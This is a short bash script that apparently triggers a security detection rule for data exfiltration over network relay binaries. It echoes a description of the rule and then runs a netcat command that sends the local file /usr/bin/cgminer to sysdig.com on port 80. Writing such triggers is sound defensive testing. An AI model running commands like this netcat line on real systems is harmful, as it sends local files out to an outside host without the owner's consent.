#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mThis rule detects potential data exfiltration activities over network relay binaries, specifically for data transfers through the network from a piped input received by a common compression tools\033[m"
nc -q 0 sysdig.com  80 < /usr/bin/cgminer >/dev/null 2>&1
